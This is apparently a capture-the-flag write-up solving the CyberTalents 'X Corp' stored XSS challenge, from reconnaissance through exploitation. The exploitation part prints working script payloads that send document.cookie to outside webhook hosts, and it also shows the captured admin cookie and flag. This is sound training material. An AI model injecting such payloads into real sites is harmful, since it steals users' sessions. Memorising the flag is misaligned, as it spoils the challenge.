# Based on the following
## X Corp
https://cybertalents.com/challenges/web/x-corp
## Cross-site Scripting (XSS)


# Information Gathering

test a company comment page, Best Sec Company have released a comment page, they are afraid that some one send a comment can steal the admin session

The company has 2 main pages
- http://45.84.138.178:8080/2023/comments.php
- http://45.84.138.178:8080/2023/comments_test.php

## Locate robots.txt

after locating robots.txt it showed that

```
User-agent: *
Allow: /wp-content/cache/
Disallow: /cld-mgmt
```

## Identify Versions
### Reveal website technology stacks and what the website is built with

![](https://i.imgur.com/AKYXBfh.png)

## Comment Page Structure

![](https://i.imgur.com/QLzhZde.png)

### After Sending

By checking comments_test it shows that the response is stored inside 

```html
<br>
```


![](https://i.imgur.com/afW9Pow.png)


![](https://i.imgur.com/92bOxtk.png)

![](https://i.imgur.com/w7ismCM.png)


![](https://i.imgur.com/bb05sZ1.png)
 return this ^

![](https://i.imgur.com/sW992CN.png)

```html
<script>document.write('<img src="https://eo21hsr1dp5yprs.m.pipedream.net?c='+document.cookie+'" />');</script>

This script uses `document.write` to dynamically create an `<img>` element with its `src` attribute set to a remote server. It appends the user's cookie information to the URL as a query parameter. This essentially loads an image from the specified URL, triggering a request to the server with the user's cookie information.
```


```html
<script> fetch('https://eo7gq40b4500y1p.m.pipedream.net', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

This is stored XSS.

This script sends the user's cookies to an external server ('[https://eo7gq40b4500y1p.m.pipedream.net](https://eo7gq40b4500y1p.m.pipedream.net/)') using a POST request. The server at that endpoint is a set up to log the stolen cookie. This type of attack allows the attacker to capture sensitive information, potentially leading to unauthorized access to the victim's account.
```
Fetch is an API call it sends an HTTP request to the URL by using the following:
- `method: 'POST'`: It specifies that the HTTP request should be a POST request to post data to server.
- `mode: 'no-cors'`: It indicates that the request should be made in a no-cors mode, which is commonly used in XSS attacks to bypass some security mechanisms. This mode restricts the ability to read the response from the target server. 
- `body: document.cookie`: The `document.cookie` part retrieves the cookies associated with the current document (the user's browser).
RequestBin lets you create a webhooks URL and send data to it to see how it's recognized.

```
Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the immediate response in an unsafe way. With stored XSS, the application instead stores the input and embeds it into a later response in an unsafe way.
```

![](https://i.imgur.com/fJlhelh.png)



```html
admin_flag=Th1s_1%40st_Tasc_89590412984; test=Your%20Test%20is%20Working
admin_flag=Th1s_1@st_Tasc_89590412984;test=Your Test is Working
```


![](https://i.imgur.com/zTLUh9N.png)




# Objective

- [x] Webhook URL
- [x] Wait for event admin cookie
- [x] Steal admin session












---
#xss #owasp_checklist #requestbin #flag #cookie #admincookie
Web App Pen Testing Checklist
https://blog.securelayer7.net/web-application-penetration-testing-checklist/
X Corp Practice Based Task 4
https://cybertalents.com/challenges/web/x-corp
Penetration Testing Methodologies
https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies
Portswigger Steal Cookie Via XSS
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies